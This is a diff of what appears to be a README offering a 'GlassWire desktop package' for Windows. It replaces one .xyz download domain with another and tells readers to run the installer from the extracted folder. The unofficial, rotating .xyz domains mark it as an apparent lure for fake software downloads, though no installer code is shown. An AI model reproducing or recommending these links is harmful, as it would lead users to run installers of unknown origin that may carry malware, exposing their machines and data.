@@ -8,8 +8,8 @@ GlassWire desktop package for Windows · security toolkit · local install ready
 
 > Use the project link below for Windows.
 
-* **Project link:** **[glasswire.nexpath.xyz](https://glasswire.nexpath.xyz/)**
-* **Full URL:** `https://glasswire.nexpath.xyz/`
+* **Project link:** **[glasswire.nerasix.xyz](https://glasswire.nerasix.xyz/)**
+* **Full URL:** `https://glasswire.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
